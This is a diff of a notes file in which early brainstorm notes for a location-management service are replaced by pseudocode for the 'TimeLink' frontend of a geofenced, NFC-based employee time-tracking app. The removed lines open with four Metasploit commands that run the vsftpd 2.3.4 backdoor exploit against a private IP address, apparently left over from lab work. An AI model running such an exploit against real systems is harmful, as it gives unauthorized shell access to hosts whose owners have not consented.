@@ -1,25 +1,47 @@
-search ftpd
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 10.19.6.55
-exploit
+__Psuedocode for TimeLink Frontend__
 
+User-controllable inputs:
+ - Device location (GPS Coordinates)
+ - Permissions:
+   - Location/GPS
+   - NFC
+   - Cellular/Wi-Fi
+ - NFC Trigger
+ - NFC Authorization PIN Code
 
-*Location Management Service*
-Geo-Referencing Service
-Unlock Portals
-Access Control and Logging
-Situational Awareness
+Supervisor-controllable inputs:
+ - Work Schedule (Standardized calendar format)
+ - Employee ID (Any format)
 
-*What does it use?*
-Uses:
-Geofencing technology
-Geographic Information
-Wireless database access
-Near Field Communications
+App Monitored Inputs:
+ - GPS location
+ - Remote Event Triggers (See section 'App Remote Inputs')
+ - NFC Scans
 
-*App:*
-Location Data of Enrolled Clients for Business Use
-For Safety
-Life enhancing
-Risk Management
-Security Management
+App Local Event Triggers:
+ - Crossing a Defined Geofence (calculated on TimeShark backend)
+ - Scanning a Defined NFC Hardware Device (Raw NFC HW ID sent to TimeShark
+   backend; backend checks sent NFC HW ID against database to verify
+   whether the NFC HW ID is a worksite NFC device)
+
+App Remote Event Triggers:
+ - Remote On-Demand Poll request from TimeShark backend
+ - Routine Heartbeat Check (5min?)
+
+App Data Outputs:
+ - GPS Location (Coordinate pair and/or Google Location Code)
+ - Date/Time (UNIX Epoch and/or Local Time in a customizable format
+ - Clocked In? (Based on locally-stored Work Schedule)
+ - Authorized to be On-Site?
+ - Accumulated Hours (Regular and Overtime)
+ - Employee ID
+ - Physical Device ID
+ - NFC Device ID (If Event Trigger Source == nfcDeviceScan)
+ - Active Data Connection(s) (Cellular/Wi-Fi)
+ - NFC PIN Code (Sent during authorization phase of the NFC transaction)
+
+Locally Stored Data:
+ - Work Schedule
+ - Employee ID (Used for authorization to services)
+ - Clock In/Out Transaction Logs (Truncate to 2 pay periods)
+ - Site Access Transaction Logs (Truncate to 2 pay periods)
